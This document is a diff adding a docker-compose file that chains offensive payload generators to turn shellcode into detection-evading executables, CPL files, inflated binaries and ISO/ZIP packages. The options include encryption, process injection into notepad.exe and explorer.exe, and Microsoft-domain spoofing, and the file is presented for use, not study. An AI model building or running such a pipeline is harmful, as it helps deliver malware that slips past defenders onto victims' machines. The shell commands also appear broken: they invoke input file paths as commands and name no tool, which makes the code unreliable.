@@ -1,0 +1,215 @@
+version: '3.8'
+
+services:
+  # Step 1: Generate payloads with Bankai
+  bankai:
+    image: ghcr.io/nn0ses/bankai:4.0
+    container_name: bankai
+    volumes:
+      - ./shellcode:/workspace/input
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for sc in /workspace/input/*.bin /workspace/input/*.exe; do
+        [ -f \"$$sc\" ] || continue;
+        base=$$(basename $$sc .bin);
+        base=$$(basename $$base .exe);
+        /workspace/input/$$base* /workspace/output/$${base}-bankai-CreateThread.exe win64_CreateThread.tmpl 64;
+      done
+      "
+    networks:
+      - pipeline
+
+  # Step 2: Generate payloads with Freeze.rs
+  freeze-rs:
+    image: ghcr.io/nn0ses/freeze-rs:4.0
+    container_name: freeze-rs
+    volumes:
+      - ./shellcode:/workspace/input
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for sc in /workspace/input/*.bin; do
+        [ -f \"$$sc\" ] || continue;
+        base=$$(basename $$sc .bin);
+        /workspace/input/$$sc /workspace/output/$${base}-freeze-AES.exe AES notepad.exe;
+      done
+      "
+    depends_on:
+      - bankai
+    networks:
+      - pipeline
+
+  # Step 3: Generate payloads with Uru
+  uru:
+    image: ghcr.io/nn0ses/uru:4.0
+    container_name: uru
+    volumes:
+      - ./shellcode:/workspace/input
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for sc in /workspace/input/*.bin; do
+        [ -f \"$$sc\" ] || continue;
+        base=$$(basename $$sc .bin);
+        /workspace/input/$$sc /workspace/output/$${base}-uru-iat-xor.exe go_example.yml;
+      done
+      "
+    depends_on:
+      - freeze-rs
+    networks:
+      - pipeline
+
+  # Step 4: Generate payloads with Shhhloader
+  shhhloader:
+    image: ghcr.io/nn0ses/shhhloader:4.0
+    container_name: shhhloader
+    volumes:
+      - ./shellcode:/workspace/input
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for sc in /workspace/input/*.bin; do
+        [ -f \"$$sc\" ] || continue;
+        base=$$(basename $$sc .bin);
+        /workspace/input/$$sc /workspace/output/$${base}-shhhloader-enum.exe EnumDisplayMonitors explorer.exe;
+      done
+      "
+    depends_on:
+      - uru
+    networks:
+      - pipeline
+
+  # Step 5: Generate payloads with ScareCrow
+  scarecrow:
+    image: ghcr.io/nn0ses/scarecrow:4.0
+    container_name: scarecrow
+    volumes:
+      - ./shellcode:/workspace/input
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for sc in /workspace/input/*.bin; do
+        [ -f \"$$sc\" ] || continue;
+        base=$$(basename $$sc .bin);
+        /workspace/input/$$sc /workspace/output/$${base}-scarecrow.exe www.microsoft.com Injector;
+      done
+      "
+    depends_on:
+      - shhhloader
+    networks:
+      - pipeline
+
+  # Step 6: Generate payloads with Nimalathatep (EXE)
+  nimalathatep-exe:
+    image: ghcr.io/nn0ses/nimalathatep:4.0
+    container_name: nimalathatep-exe
+    volumes:
+      - ./shellcode:/workspace/input
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for sc in /workspace/input/*.bin; do
+        [ -f \"$$sc\" ] || continue;
+        base=$$(basename $$sc .bin);
+        /workspace/input/$$sc /workspace/output/$${base}-nim-VirtualAlloc.exe VirtualAllocEx exe;
+      done
+      "
+    depends_on:
+      - scarecrow
+    networks:
+      - pipeline
+
+  # Step 7: Generate payloads with Nimalathatep (CPL)
+  nimalathatep-cpl:
+    image: ghcr.io/nn0ses/nimalathatep:4.0
+    container_name: nimalathatep-cpl
+    volumes:
+      - ./shellcode:/workspace/input
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for sc in /workspace/input/*.bin; do
+        [ -f \"$$sc\" ] || continue;
+        base=$$(basename $$sc .bin);
+        /workspace/input/$$sc /workspace/output/$${base}-nim-CreateThread.cpl CreateThread cpl;
+      done
+      "
+    depends_on:
+      - nimalathatep-exe
+    networks:
+      - pipeline
+
+  # Step 8: Mangle payloads (inflate to 50MB)
+  mangle:
+    image: ghcr.io/nn0ses/mangle:4.0
+    container_name: mangle
+    volumes:
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for payload in /workspace/output/*-bankai-CreateThread.exe; do
+        [ -f \"$$payload\" ] || continue;
+        base=$$(basename $$payload -bankai-CreateThread.exe);
+        /workspace/output/$$(basename $$payload) /workspace/output/$${base}-bankai-mangled-50MB.exe 50;
+      done
+      "
+    depends_on:
+      - nimalathatep-cpl
+    networks:
+      - pipeline
+
+  # Step 9: Pack into ISO
+  packmypayload-iso:
+    image: ghcr.io/nn0ses/packmypayload:4.0
+    container_name: packmypayload-iso
+    volumes:
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for payload in /workspace/output/*-freeze-AES.exe; do
+        [ -f \"$$payload\" ] || continue;
+        base=$$(basename $$payload .exe);
+        /workspace/output/$$(basename $$payload) /workspace/output/$${base}.iso iso $$(basename $$payload);
+      done
+      "
+    depends_on:
+      - mangle
+    networks:
+      - pipeline
+
+  # Step 10: Pack into ZIP
+  packmypayload-zip:
+    image: ghcr.io/nn0ses/packmypayload:4.0
+    container_name: packmypayload-zip
+    volumes:
+      - ./output:/workspace/output
+    command: >
+      sh -c "
+      for payload in /workspace/output/*-scarecrow.exe; do
+        [ -f \"$$payload\" ] || continue;
+        base=$$(basename $$payload .exe);
+        /workspace/output/$$(basename $$payload) /workspace/output/$${base}.zip zip;
+      done
+      "
+    depends_on:
+      - packmypayload-iso
+    networks:
+      - pipeline
+
+  # Step 11: Generate hash report
+  hash-generator:
+    image: ghcr.io/nn0ses/hash-generator:4.0
+    container_name: hash-generator
+    volumes:
+      - ./output:/workspace/output
+      - ./hashes:/workspace/hashes
+      - ./logs:/workspace/logs
+    depends_on:
+      - packmypayload-zip
+    networks:
+      - pipeline
+
+networks:
+  pipeline:
+    driver: bridge
